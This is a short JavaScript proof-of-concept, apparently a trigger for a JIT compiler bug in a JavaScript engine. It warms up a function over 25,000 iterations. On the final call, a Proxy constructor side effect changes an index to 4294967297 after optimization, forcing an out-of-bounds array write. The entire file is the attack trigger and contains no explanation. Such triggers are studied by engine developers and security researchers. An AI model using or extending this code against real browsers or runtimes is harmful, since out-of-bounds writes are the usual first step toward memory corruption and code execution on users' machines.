function poc(flag, holder) {
    const arr = [1.1, 2.2, 3.3, 4.4, 5.5];
    new P(flag, holder);
    let index = holder.idx;

    for (let i = 0; i < 1; ++i) {
        index = index + 1;
    }

    arr[index] = 6.6;
}

const P = new Proxy(Object, {
    construct(target, args) {
        if (args[0]) {
            args[1].idx = 4294967297;
        }
        return {};
    }
});

let do_trigger = false;
for (let i = 0; i < 25000; ++i) {
    if (i === 24999) do_trigger = true;
    let holder = { idx: 0 };
    poc(do_trigger, holder);
}